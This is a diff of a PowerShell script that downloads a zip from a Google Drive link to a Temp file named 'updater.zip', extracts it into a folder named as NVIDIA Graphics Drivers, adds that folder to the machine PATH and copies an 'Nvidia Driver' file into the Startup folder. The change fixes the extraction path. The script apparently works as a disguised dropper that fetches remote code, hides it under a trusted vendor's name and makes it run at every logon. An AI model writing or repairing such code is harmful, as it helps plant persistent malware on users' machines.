@@ -3,7 +3,7 @@ $zipFile = "https://drive.usercontent.google.com/download?id=19ynD0Kgp6YOhS3tNBt
 $op = "C:\Users\$username\AppData\Local\Temp\updater.zip"
 $cmd1 = "curl `"$zipFile`" --output `"$op`""
 cmd /c $cmd1
-Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\NVIDIA Graphics Drivers"
+Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Program Files\NVIDIA Graphics Drivers"
 $Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
 [Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
 cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
